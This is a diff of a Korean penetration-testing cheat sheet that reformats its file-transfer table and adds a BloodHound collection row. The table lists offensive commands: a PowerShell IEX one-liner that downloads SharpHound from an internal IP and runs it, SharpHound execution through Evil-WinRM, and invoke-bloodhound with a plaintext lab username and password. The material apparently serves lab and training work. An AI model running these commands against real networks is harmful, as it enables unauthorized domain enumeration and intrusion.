@@ -112,12 +112,15 @@
 
 ## 파일 전송 중
 
-| 명령                                                                                                                       | 설명                                                                  |
-| ------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------- |
-| `sudo python3 -m http.server 8001`                                                                                       | 빠른 파일 호스팅을 위해 Python 웹 서버를 시작합니다. Linux 기반 호스트에서 수행됩니다.             |
-| `"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"`                                   | 웹 서버에서 파일을 다운로드하는 데 사용되는 PowerShell 한 줄입니다. Windows 기반 호스트에서 수행됩니다. |
-| _Evil-WinRM_ PS C:\Users\svc-alfresco\Desktop> .\SharpHound.exe -c All --zipFilename ILFREIGHT                           | SharpHound 실행                                                       |
-| `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/` | `SMB`파일의 빠른 호스팅을 위해 impacket 서버를 시작합니다 . Windows 기반 호스트에서 수행됩니다.    |
+| 명령                                                                                                                                                                               | 설명                                                                                                                                                  |
+| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `sudo python3 -m http.server 8001`                                                                                                                                               | 빠른 파일 호스팅을 위해 Python 웹 서버를 시작합니다. Linux 기반 호스트에서 수행됩니다.                                                                                             |
+| `"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"`                                                                                           | 웹 서버에서 파일을 다운로드하는 데 사용되는 PowerShell 한 줄입니다. Windows 기반 호스트에서 수행됩니다.                                                                                 |
+| _Evil-WinRM_ PS C:\Users\svc-alfresco\Desktop> .\SharpHound.exe -c All --zipFilename ILFREIGHT                                                                                   | SharpHound 실행                                                                                                                                       |
+| <p>. .\SharpHound.ps1 #sharphound를  현재  세션션에 불러드림</p><pre><code>invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
+</code></pre> | <p>SharpHound.ps1 실행</p><pre><code>invoke-bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice
+</code></pre> |
+| `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/`                                                         | `SMB`파일의 빠른 호스팅을 위해 impacket 서버를 시작합니다 . Windows 기반 호스트에서 수행됩니다.                                                                                    |
 
 ## 커베로스팅
 
